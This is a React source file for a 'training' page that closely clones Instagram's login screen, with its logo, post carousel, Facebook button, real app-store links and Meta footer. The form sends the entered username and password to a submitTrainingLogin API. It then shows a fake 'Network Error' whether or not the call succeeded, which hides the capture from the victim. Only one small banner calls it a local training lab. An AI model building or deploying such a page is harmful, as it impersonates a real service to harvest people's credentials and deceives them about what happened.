import { useState, useEffect, useRef } from "react";
import { LoaderCircle, WifiOff, CheckCircle2, X, Moon, Sun, Eye, EyeOff } from "lucide-react";
import { submitTrainingLogin } from "../api/trainingApi";
import "../styles/cybersecurity.css";

const SLIDES = [
  {
    user: "alex_adventures",
    avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80",
    image: "https://images.unsplash.com/photo-1682687220063-4742bd7fd538?auto=format&fit=crop&w=600&q=80",
    caption: "Chasing mountain sunsets 🏔️✨ #nature #adventure",
    likes: "2,410 likes",
    location: "Swiss Alps, Switzerland",
  },
  {
    user: "coffee_notes",
    avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=100&q=80",
    image: "https://images.unsplash.com/photo-1509042239860-f550ce710b93?auto=format&fit=crop&w=600&q=80",
    caption: "Morning roast and quiet moments ☕📖 #coffeetime",
    likes: "1,850 likes",
    location: "Portland, Oregon",
  },
  {
    user: "urban_lens",
    avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=100&q=80",
    image: "https://images.unsplash.com/photo-1514565131-fce0801e5785?auto=format&fit=crop&w=600&q=80",
    caption: "Neon reflections in the night rain 🌆🏙️ #citylights",
    likes: "4,120 likes",
    location: "Tokyo, Japan",
  },
];

const LANGUAGES = [
  "English", "Español", "Français", "Deutsch", "Italiano",
  "Português", "हिन्दी", "日本語", "한국어", "Tiếng Việt",
  "中文(简体)", "中文(繁體)", "Русский", "العربية", "Türkçe",
];

/* ─────────────────────────────────────────────
   Icon Components
   ───────────────────────────────────────────── */

const InstagramLogo = ({ color = "#262626" }) => (
  <div className="ig-logo-lockup" aria-label="Instagram">
    <svg
      className="ig-logo-glyph"
      viewBox="0 0 24 24"
      width="40"
      height="40"
      fill="none"
      stroke={color}
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
      <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
      <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
    </svg>
    <span className="ig-logo-wordmark" style={{ color }}>
      Instagram
    </span>
  </div>
);

const FacebookIcon = ({ size = 16, color = "currentColor" }) => (
  <svg aria-hidden="true" width={size} height={size} viewBox="0 0 24 24" fill={color}>
    <path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z" />
  </svg>
);

const HeartIcon = ({ filled = false, size = 24 }) => (
  <svg aria-label="Like" height={size} width={size} viewBox="0 0 24 24"
    fill={filled ? "#ed4956" : "none"}
    stroke={filled ? "#ed4956" : "currentColor"}
    strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z" />
  </svg>
);

const CommentIcon = ({ size = 24 }) => (
  <svg aria-label="Comment" height={size} width={size} viewBox="0 0 24 24"
    fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />
  </svg>
);

const ShareIcon = ({ size = 24 }) => (
  <svg aria-label="Share Post" height={size} width={size} viewBox="0 0 24 24"
    fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <line x1="22" y1="2" x2="11" y2="13" />
    <polygon points="22 2 15 22 11 13 2 9 22 2" />
  </svg>
);

const BookmarkIcon = ({ filled = false, size = 24 }) => (
  <svg aria-label="Save" height={size} width={size} viewBox="0 0 24 24"
    fill={filled ? "currentColor" : "none"} stroke="currentColor"
    strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" />
  </svg>
);

const MoreIcon = ({ size = 16 }) => (
  <svg aria-label="More options" height={size} width={size} viewBox="0 0 24 24" fill="currentColor">
    <circle cx="12" cy="12" r="1.5" />
    <circle cx="6" cy="12" r="1.5" />
    <circle cx="18" cy="12" r="1.5" />
  </svg>
);

const CarouselIcon = ({ size = 14 }) => (
  <svg aria-label="Carousel" height={size} width={size} viewBox="0 0 48 48" fill="currentColor">
    <path d="M34.8 29.7V11c0-2.9-2.3-5.2-5.2-5.2H11c-2.9 0-5.2 2.3-5.2 5.2v18.7c0 2.9 2.3 5.2 5.2 5.2h18.7c2.8-.1 5.1-2.4 5.1-5.2zM39.2 15v16.2c0 4.5-3.7 8.2-8.2 8.2H14.9c-.6 0-.9.7-.5 1.1 1 1.1 2.4 1.8 4.1 1.8h13.4c5.7 0 10.3-4.6 10.3-10.3V18.5c0-1.6-.7-3.1-1.8-4.1-.5-.4-1.2 0-1.2.6z" />
  </svg>
);

const LocationIcon = ({ size = 12 }) => (
  <svg aria-label="Location" height={size} width={size} viewBox="0 0 24 24"
    fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" />
    <circle cx="12" cy="10" r="3" />
  </svg>
);

const GooglePlayBadge = () => (
  <svg viewBox="0 0 135 40" width="135" height="40" aria-label="Get it on Google Play">
    <rect width="135" height="40" rx="6" fill="#000" />
    <path d="M12.5 9.5l11.5 10.5-11.5 10.5c-.4-.3-.6-.8-.6-1.4V10.9c0-.6.2-1.1.6-1.4z" fill="#00D2FF" />
    <path d="M28.5 14.2l-4.5 4.1 4.5 4.1 4.7-2.7c1.1-.6 1.1-2.1 0-2.8l-4.7-2.7z" fill="#FFCE00" />
    <path d="M12.5 9.5L24 20 12.5 30.5c-.4-.3-.6-.8-.6-1.4V10.9c0-.6.2-1.1.6-1.4z" fill="#00F076" />
    <path d="M24 20l4.5-4.1-15-8.6c-.6-.3-1.2-.3-1.7 0L24 20z" fill="#00E0FF" />
    <path d="M11.8 7.3c-.3.1-.6.3-.8.6L24 20l3.7-3.4L12.5 9.5c-.2-.1-.4-.2-.7-.2z" fill="#00E676" />
    <text x="42" y="16" fill="#fff" fontSize="8" fontFamily="Arial, sans-serif">GET IT ON</text>
    <text x="42" y="30" fill="#fff" fontSize="14" fontWeight="bold" fontFamily="Arial, sans-serif">Google Play</text>
  </svg>
);

const AppStoreBadge = () => (
  <svg viewBox="0 0 135 40" width="135" height="40" aria-label="Download on the App Store">
    <rect width="135" height="40" rx="6" fill="#000" />
    <path d="M31.5 20.5c0-3.6 3-5.4 3.1-5.5-1.7-2.5-4.3-2.8-5.2-2.9-2.2-.2-4.3 1.3-5.4 1.3-1.1 0-2.8-1.3-4.6-1.2-2.4 0-4.6 1.4-5.8 3.5-2.5 4.3-.6 10.6 1.8 14.1 1.2 1.7 2.6 3.6 4.5 3.5 1.8-.1 2.5-1.2 4.7-1.2 2.2 0 2.8 1.2 4.7 1.2 1.9 0 3.2-1.7 4.4-3.5 1.4-2 2-3.9 2-4-.1-.1-3.8-1.5-3.8-5.3zm-3.4-10.7c1-1.2 1.6-2.9 1.4-4.6-1.4.1-3.1.9-4.1 2.1-.9 1.1-1.7 2.8-1.5 4.5 1.6.1 3.2-.8 4.2-2z" fill="#fff" />
    <text x="42" y="16" fill="#fff" fontSize="8" fontFamily="Arial, sans-serif">Download on the</text>
    <text x="42" y="30" fill="#fff" fontSize="14" fontWeight="bold" fontFamily="Arial, sans-serif">App Store</text>
  </svg>
);

/* ─────────────────────────────────────────────
   Reusable floating-label input
   ───────────────────────────────────────────── */
function FloatingInput({
  id,
  type = "text",
  value,
  onChange,
  label,
  inputRef,
  autoComplete,
  trailing,
  hasError,
}) {
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;

  return (
    <div
      className={`ig-field ${active ? "is-active" : ""} ${focused ? "is-focused" : ""} ${hasError ? "has-error" : ""}`}
    >
      <input
        id={id}
        ref={inputRef}
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        autoComplete={autoComplete}
        className="ig-field-input"
        aria-label={label}
        placeholder=" "
      />
      <label htmlFor={id} className="ig-field-label">
        {label}
      </label>
      {trailing && <div className="ig-field-trailing">{trailing}</div>}
    </div>
  );
}

/* ─────────────────────────────────────────────
   Main Component
   ───────────────────────────────────────────── */

function TrainingLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [isPaused, setIsPaused] = useState(false);
  const [darkMode, setDarkMode] = useState(false);
  const [selectedLang, setSelectedLang] = useState("English");
  const [likedSlides, setLikedSlides] = useState({});
  const [savedSlides, setSavedSlides] = useState({});

  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [message, setMessage] = useState("");
  const [fieldErrors, setFieldErrors] = useState({});

  const usernameRef = useRef(null);
  const passwordRef = useRef(null);

  const isFormValid = username.trim().length > 0 && password.length >= 6;

  const getPasswordStrength = (pass) => {
    if (!pass) return null;
    if (pass.length < 6) return { label: "Weak", color: "#ef4444", percent: 30 };
    if (pass.length < 10 || !/[0-9]/.test(pass) || !/[A-Z]/.test(pass)) {
      return { label: "Medium", color: "#eab308", percent: 65 };
    }
    return { label: "Strong", color: "#22c55e", percent: 100 };
  };

  const strength = getPasswordStrength(password);

  useEffect(() => {
    if (isPaused) return;
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % SLIDES.length);
    }, 4500);
    return () => clearInterval(timer);
  }, [isPaused]);

  useEffect(() => {
    document.body.classList.toggle("ig-dark-body", darkMode);
    return () => document.body.classList.remove("ig-dark-body");
  }, [darkMode]);

  const toggleLike = (idx, e) => {
    e?.stopPropagation?.();
    setLikedSlides((prev) => ({ ...prev, [idx]: !prev[idx] }));
  };

  const toggleSave = (idx, e) => {
    e?.stopPropagation?.();
    setSavedSlides((prev) => ({ ...prev, [idx]: !prev[idx] }));
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    const errors = {};

    if (!username.trim()) {
      errors.username = "Please enter your username, phone, or email.";
    }
    if (!password) {
      errors.password = "Please enter your password.";
    } else if (password.length < 6) {
      errors.password = "Password must be at least 6 characters.";
    }

    setFieldErrors(errors);

    if (Object.keys(errors).length > 0) {
      setMessage("Please fix the highlighted fields.");
      if (errors.username) usernameRef.current?.focus();
      else if (errors.password) passwordRef.current?.focus();
      return;
    }

    setLoading(true);
    setSubmitted(false);
    setMessage("");

    try {
      await submitTrainingLogin(username, password);
      setSubmitted(true);
      setMessage("Network Error: Unable to connect to server");
    } catch {
      setSubmitted(true);
      setMessage("Network Error: Unable to connect to server");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className={`ig-page ${darkMode ? "dark-theme" : ""}`}>
      <div className="ig-top-controls">
        <button
          type="button"
          className="ig-theme-toggle"
          onClick={() => setDarkMode(!darkMode)}
          title={`Switch to ${darkMode ? "Light" : "Dark"} Mode`}
          aria-label={`Switch to ${darkMode ? "Light" : "Dark"} Mode`}
        >
          {darkMode ? <Sun size={16} /> : <Moon size={16} />}
          <span>{darkMode ? "Light Mode" : "Dark Mode"}</span>
        </button>
      </div>

      <main className="ig-main">
        <div className="ig-container">
          {/* Left Phone Mockup */}
          <div
            className="ig-phone-frame"
            onMouseEnter={() => setIsPaused(true)}
            onMouseLeave={() => setIsPaused(false)}
          >
            <div className="ig-phone-inner">
              <div className="ig-phone-notch" />
              <div className="ig-phone-status-bar">
                <span>9:41</span>
                <div className="ig-status-icons">
                  <svg width="17" height="11" viewBox="0 0 17 11" fill="currentColor">
                    <rect x="0" y="7" width="3" height="4" rx="1" />
                    <rect x="4" y="5" width="3" height="6" rx="1" />
                    <rect x="8" y="2.5" width="3" height="8.5" rx="1" />
                    <rect x="12" y="0" width="3" height="11" rx="1" />
                  </svg>
                  <svg width="16" height="11" viewBox="0 0 16 11" fill="currentColor">
                    <path d="M8 2.5c1.9 0 3.6.7 4.9 1.8l1.4-1.4C12.6 1.4 10.4.5 8 .5S3.4 1.4 1.7 2.9l1.4 1.4C4.4 3.2 6.1 2.5 8 2.5zm0 3.3c1.1 0 2.1.4 2.9 1.1l1.4-1.4C11.3 4.6 9.7 4 8 4s-3.3.6-4.3 1.5l1.4 1.4c.8-.7 1.8-1.1 2.9-1.1zm0 3.2c.6 0 1.1.2 1.5.6L8 11 6.5 9.6c.4-.4.9-.6 1.5-.6z" />
                  </svg>
                  <svg width="25" height="12" viewBox="0 0 25 12" fill="none">
                    <rect x="0.5" y="0.5" width="21" height="11" rx="3" stroke="currentColor" opacity="0.5" />
                    <rect x="2" y="2" width="18" height="8" rx="1.5" fill="currentColor" />
                    <rect x="23" y="4" width="2" height="4" rx="1" fill="currentColor" opacity="0.5" />
                  </svg>
                </div>
              </div>

              <div className="ig-phone-screen">
                {SLIDES.map((slide, index) => (
                  <div
                    key={index}
                    className={`ig-slide ${index === currentSlide ? "active" : ""}`}
                    aria-hidden={index !== currentSlide}
                  >
                    <div className="ig-slide-header">
                      <div className="ig-slide-avatar-ring">
                        <img src={slide.avatar} alt={slide.user} className="ig-slide-avatar" />
                      </div>
                      <div className="ig-slide-user-meta">
                        <span className="ig-slide-username">{slide.user}</span>
                        {slide.location && (
                          <span className="ig-slide-location">
                            <LocationIcon /> {slide.location}
                          </span>
                        )}
                      </div>
                      <button type="button" className="ig-slide-more" aria-label="More options">
                        <MoreIcon />
                      </button>
                    </div>

                    <div className="ig-slide-img-wrap" onDoubleClick={() => toggleLike(index)}>
                      <img src={slide.image} alt="Post" className="ig-slide-img" />
                      {likedSlides[index] && (
                        <div className="ig-slide-heart-pop" aria-hidden="true">
                          <HeartIcon filled size={80} />
                        </div>
                      )}
                    </div>

                    <div className="ig-slide-footer">
                      <div className="ig-slide-actions">
                        <button
                          type="button"
                          className="ig-action-btn"
                          onClick={(e) => toggleLike(index, e)}
                          aria-label="Like"
                        >
                          <HeartIcon filled={likedSlides[index]} />
                        </button>
                        <button type="button" className="ig-action-btn" aria-label="Comment">
                          <CommentIcon />
                        </button>
                        <button type="button" className="ig-action-btn" aria-label="Share">
                          <ShareIcon />
                        </button>
                        <button
                          type="button"
                          className="ig-action-btn ig-action-save"
                          onClick={(e) => toggleSave(index, e)}
                          aria-label="Save"
                        >
                          <BookmarkIcon filled={savedSlides[index]} />
                        </button>
                      </div>
                      <div className="ig-slide-likes">{slide.likes}</div>
                      <div className="ig-slide-caption">
                        <strong>{slide.user}</strong> {slide.caption}
                      </div>
                      <div className="ig-slide-time">2 hours ago</div>
                    </div>
                  </div>
                ))}

                <div className="ig-phone-carousel-indicator">
                  <CarouselIcon />
                </div>
                <div className="ig-phone-dots">
                  {SLIDES.map((_, i) => (
                    <button
                      key={i}
                      type="button"
                      className={`ig-dot ${i === currentSlide ? "active" : ""}`}
                      onClick={() => setCurrentSlide(i)}
                      aria-label={`Go to slide ${i + 1}`}
                    />
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* Right Login Box */}
          <div className="ig-auth-wrapper">
            <div className="ig-card ig-main-card">
              <div className="ig-logo-wrap">
                <InstagramLogo color={darkMode ? "#f5f5f5" : "#262626"} />
              </div>

              <form className="ig-form" onSubmit={handleSubmit} noValidate>
                <FloatingInput
                  id="username"
                  type="text"
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (fieldErrors.username) {
                      setFieldErrors((p) => ({ ...p, username: undefined }));
                    }
                  }}
                  label="Phone number, username, or email"
                  inputRef={usernameRef}
                  autoComplete="username"
                  hasError={!!fieldErrors.username}
                  trailing={
                    username.length > 0 ? (
                      <button
                        type="button"
                        className="ig-field-clear"
                        onClick={() => {
                          setUsername("");
                          usernameRef.current?.focus();
                        }}
                        aria-label="Clear username"
                      >
                        <X size={14} />
                      </button>
                    ) : null
                  }
                />

                <FloatingInput
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (fieldErrors.password) {
                      setFieldErrors((p) => ({ ...p, password: undefined }));
                    }
                  }}
                  label="Password"
                  inputRef={passwordRef}
                  autoComplete="current-password"
                  hasError={!!fieldErrors.password}
                  trailing={
                    password.length > 0 ? (
                      <button
                        type="button"
                        className="ig-field-toggle"
                        onClick={() => setShowPassword(!showPassword)}
                        aria-label={showPassword ? "Hide password" : "Show password"}
                      >
                        {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                      </button>
                    ) : null
                  }
                />

                {fieldErrors.username && (
                  <p className="ig-field-error-text" role="alert">{fieldErrors.username}</p>
                )}
                {fieldErrors.password && (
                  <p className="ig-field-error-text" role="alert">{fieldErrors.password}</p>
                )}

                {strength && (
                  <div className="ig-strength-bar-wrap" aria-live="polite">
                    <div className="ig-strength-track">
                      <div
                        className="ig-strength-bar"
                        style={{
                          width: `${strength.percent}%`,
                          backgroundColor: strength.color,
                        }}
                      />
                    </div>
                    <span className="ig-strength-label" style={{ color: strength.color }}>
                      {strength.label} password
                    </span>
                  </div>
                )}

                <button
                  type="submit"
                  className={`ig-login-btn ${isFormValid ? "active" : ""}`}
                  disabled={loading || !isFormValid}
                >
                  {loading ? <LoaderCircle className="ig-spin" size={18} /> : "Log in"}
                </button>
              </form>

              <div className="ig-divider">
                <div className="ig-divider-line" />
                <span className="ig-divider-text">OR</span>
                <div className="ig-divider-line" />
              </div>

              <button type="button" className="ig-fb-btn">
                <FacebookIcon size={16} color="#385185" />
                <span>Log in with Facebook</span>
              </button>

              <a href="#" className="ig-forgot">
                Forgot password?
              </a>

              <div className="ig-training-banner">
                <CheckCircle2 size={14} style={{ color: "#0095f6", flexShrink: 0 }} />
                <span>Local cybersecurity training lab. Use dummy credentials.</span>
              </div>
            </div>

            <div className="ig-card ig-signup-card">
              <p className="ig-signup-text">
                Don't have an account?{" "}
                <a href="#" className="ig-signup-link">Sign up</a>
              </p>
            </div>

            <div className="ig-get-app">
              <p>Get the app.</p>
              <div className="ig-badges">
                <a
                  href="https://play.google.com/store/apps/details?id=com.instagram.android"
                  target="_blank"
                  rel="noreferrer"
                  className="ig-app-badge"
                  aria-label="Get it on Google Play"
                >
                  <GooglePlayBadge />
                </a>
                <a
                  href="https://apps.apple.com/app/instagram/id389801252"
                  target="_blank"
                  rel="noreferrer"
                  className="ig-app-badge"
                  aria-label="Download on the App Store"
                >
                  <AppStoreBadge />
                </a>
              </div>
            </div>

            {!submitted && message && (
              <div className="ig-alert-box" role="alert">{message}</div>
            )}

            {submitted && (
              <div className="ig-network-error" role="alert">
                <WifiOff size={18} />
                <div>
                  <strong>Network Error</strong>
                  <p>Unable to connect to server</p>
                </div>
              </div>
            )}
          </div>
        </div>
      </main>

      <footer className="ig-footer">
        <div className="ig-footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading &amp; Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>
        <div className="ig-footer-copyright">
          <select
            className="ig-lang-select"
            value={selectedLang}
            onChange={(e) => setSelectedLang(e.target.value)}
            aria-label="Change language"
          >
            {LANGUAGES.map((lang) => (
              <option key={lang} value={lang}>{lang}</option>
            ))}
          </select>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}

export default TrainingLogin;